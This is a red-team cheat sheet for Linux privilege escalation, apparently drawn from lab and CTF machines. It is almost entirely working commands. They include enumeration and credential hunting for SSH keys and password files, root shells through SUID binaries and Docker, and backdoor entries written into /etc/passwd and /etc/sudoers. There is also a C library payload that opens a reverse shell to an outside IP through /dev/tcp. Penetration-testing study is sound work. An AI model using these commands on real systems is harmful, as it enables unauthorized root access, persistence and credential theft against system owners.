---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/privilege-escalation/linux/escalation
---

# Escalation

### Enumerate

```bash
file /bin/bash
# /bin/bash ELF 32-LSB Executable
# gcc exploit.c -o exploit --no-pie

# /bin/bash ELF 32-LSB pie Executable
# gcc exploit.c -o exploit

lsb_release -a
uname -a
cat /etc/*-release
env
cat /proc/version

# Search Config Files!
ls /var/www 
ls /var/www/html        
ls /var/tmp
ls /tmp
ls /dev/shm
ls /var/mail

# Search extend user attribute not ext4
cat /etc/fstab    
mount

# Looking for file or directory not create by root
ls /etc                
ls -lsa /etc | grep -i '.secret'
ls -lsa /etc/passwd
ls -lsa /etc/shadow
cat /etc/crontab
ls -lsa /etc/cron*
ps aux | grep -i 'root' --color=auto

# Looking for listening on 127.0.0.1
netstat -tupln | grep -i '127.0.0.1' --color=auto  

# expanding all subdirectory
ls -lsaR /home 2>/dev/null

# SUID 
find / -type f -perm -04000 -ls 2>/dev/null
find / -perm -u=s -type f -ls 2>/dev/null
find / -perm -g=s -type f -ls 2>/dev/null
find / -type f -user yash 2>/dev/null
find / -user root -perm /4000 2>/dev/null
find / -type f -name '*.txt' 2>/dev/null 
find / -user root -perm -4000 -exec ls -ldb {}; > /tmp/suid
getcap -r / 2>/dev/null 
find / -group users -ls 2>/dev/null
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
https://pentestlab.blog/2017/09/25/suid-executables/
https://gtfobins.github.io/gtfobins/git/

# File Capabilities (extended privilege -ep)
getcap -r / 2>/dev/null
python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# grep keyword
grep -iR 'db' . --color=auto
grep -iR 'sql' . --color=auto

#Find file
find /home/pin/ -user pin -perm /a+r -type f

# Firewall Enumerate
grep -Hs iptables /etc/*

# File Permission
find / -writable -type d 2>/dev/null

# Mount Enumerate
mount
cat /etc/fstab
/bin/lsblk

# Mount Drive from Window
mount -t cifs //10.10.10.10/file-name /path-mount

# Writeable Configuration Files
[cmeeks@hetemit restjson_hetemit]$ find /etc -type f -writable 2> /dev/null
find /etc -type f -writable 2> /dev/null
/etc/systemd/system/pythonapp.service

# Password Hunting
grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2>/dev/null
locate password | more
locate passwd | more
find / -name authorized_keys 2>/dev/null
find / -name id_rsa 2>/dev/null
grep -nr “db_user”as
```

### Bin/Bash

```bash
awk --> awk 'BEGIN {system{"/bin/bash"}}'
find --> find / -exec /usr/bin/awk 'BEGIN {system{"/bin/bash"}}' \;
perl --> perl -e 'exec "/bin/sh";'
nmap --> sudo nmap --script=/var/tmp/shell.nse
#echo "os.execute('/bin/bash')" > /var/tmp/shell.nse
docker --> docker image ls; docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### Jailed SSH Shell

```bash
Jailed SSH Shell
==============================================================================
1. ssh test@10.10.10.10 "/bin/sh"
2. cd $HOME
3. mv .bashrc .bashrc.BAK 
4. exit
5. ssh test@10.10.10.10
```

### Improve Shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='clear; ls -lsaht --color=auto'
Ctrl + z [Backgroup Process]
stty raw -echo; fg; reset
stty columns 200 rows 200
```

### rBash Bypass

```bash
@:~$ ls /home/1/usr/bin
ls /home/ryuu/usr/bin
Command 'ls' is available in '/bin/ls'
The command could not be located because '/bin' is not included in the PATH environment variable.
ls: command not found
@beta:~$ export PATH="/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games"
export PATH="/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games"

ssh -i id_rsa tom@$ip -t "bash --noprofile"
Type: vi
ESC -> :set shell=/bin/bash -> Enter -> :shell -> Enter
```

### Restricted Shell

```bash
echo os.system("/bin/bash")
```

### Auto Script

```bash
echo "cp /bin/dash /var/tmp/dash; chmod u+s /var/tmp/dash" >> backup.sh
```

### Add sudoers

```bash
echo 'user1 ALL=NOPASSWD: ALL' >> /etc/sudoers
```

### Generate Hash with User (/etc/passwd)

```bash
└─$ openssl passwd -1 -salt pass L@ughing1
$1$pass$8IGDfSQaDsZYGnWdXS.120
laughing:$1$pass$8IGDfSQaDsZYGnWdXS.120:0:0:root:/root:/bin/bash

echo 'test:$1$pass$8IGDfSQaDsZYGnWdXS.120:0:0:test:/root:/bin/bash' >> /etc/passwd

└─$ su laughing
```

### Generate Hash with user (/etc/shadow)

```bash
└─$ mkpasswd -m sha-512 password123    
$6$Kmnxa1cpu4AV/7tk$JWOgFN8CAugaDPsTMpYQbCNqdAFNBACYJ18n3mfhI/IKxItlD3EncsD2P/tUq0dNcX0oIWWCNaeQYMfI2STDK/
laughing:$6$Kmnxa1cpu4AV/7tk$JWOgFN8CAugaDPsTMpYQbCNqdAFNBACYJ18n3mfhI/IKxItlD3EncsD2P/tUq0dNcX0oIWWCNaeQYMfI2STDK/:0:0:root:/root:/bin/bash
```

### Python

```bash
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Access to other user&#x20;

```bash
sudo -i -u user1
```

### Background the Process

Resource: [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

```bash
wget 10.10.14.13/pspy32 
chmod +x pspy32
./pspy32
```

<figure><img src="../../../../.gitbook/assets/image (937).png" alt=""><figcaption></figcaption></figure>

```bash
#!/bin/bash

#loop by line
IFS=$'\n'

old_process=$(ps -eo command)

while true; do
	new_process=$(ps -eo command)
	diff <(echo "$old_process") <(echo "$new_process")
	sleep 1
	old_process=$new_process
done
```

### Linux Login

```bash
1: ssh user@10.10.10.10
2: ssh -i id_rsa user@10.10.10.10
3: rdesktop 10.10.10.10 (GUI)
4: vncviewer 10.10.10.10:5901 (GUI)
5: ssh -X user@10.10.10.10 (Some programs need GUI)
```

### Docker

Resource: [https://gtfobins.github.io/gtfobins/docker/](https://gtfobins.github.io/gtfobins/docker/)

First let check the docker images that available:

```bash
@:~$ docker image ls
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
redmine             latest              0c8429c66e07        21 months ago       542MB
postgres            latest              adf2b126dda8        21 months ago       313MB
```

We can use the technique from above and replace with our current alpine name.

```bash
@:~$ docker run -v /:/mnt --rm -it redmine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```

### Crontab

C language Escalation

```c
[pablo@sybaris dev]$ cat utils.c 
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init()
{
        setgid(0);
        setuid(0);
        system("bash -i >& /dev/tcp/10.10.10.10/4444 0>&1");
}
```

```bash
ls -lah /etc/cron*

cat /etc/crontab
```

```bash
grep "CRON" /var/log/cron.log
```

### Chmod

```
sudo -l 
(root) NOPASSWD: /bin/chmod

ls -l /bin/bash
sudo chmod 4755 /bin/bash
ls -l /bin/bash     # (-rwsr-xr-x)
bash -p
```

<figure><img src="../../../../.gitbook/assets/image (938).png" alt=""><figcaption></figcaption></figure>

### SUID

Resource:

{% embed url="https://gtfobins.github.io/" %}

#### Nmap&#x20;

<figure><img src="../../../../.gitbook/assets/image (939).png" alt=""><figcaption></figcaption></figure>

```bash
$ find / -user root -perm -4000 -exec ls -ldb {} \; 2> /dev/null
-rwsr-xr-x 1 root root 2838168 Dec 21  2016 /usr/bin/nmap

$ echo 'os.execute("/bin/sh")' > /tmp/x.nse
echo 'os.execute("/bin/sh")' > /tmp/x.nse
$ 
$ nmap --script /tmp/x.nse
nmap --script /tmp/x.nse

Starting Nmap 7.40 ( https://nmap.org ) at 2020-04-24 06:16 EDT
WARNING: Running Nmap setuid, as you are doing, is a major security risk.

id
uid=108(adm) gid=112(adm) euid=0(root) groups=112(adm)
```

#### wget

```bash
cat /tmp/sudoers
userA    ALL=NOPASSWD:ALL
python2 -m SimpleHTTPServer 80
wget 127.0.0.1/sudoers -O /etc/sudoers
sudo bsah
```

#### Find

```bash
postgres@debian:/var/lib/postgresql/11/main$ find / -perm -u=s -type f 2>/dev/null
<esql/11/main$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/sudo
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/find
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
postgres@debian:/var/lib/postgresql/11/main$

postgres@debian:/var/lib/postgresql/11/main$ find . -exec /bin/sh -p \; -quit
find . -exec /bin/sh -p \; -quit
# whoami
whoami
root
```
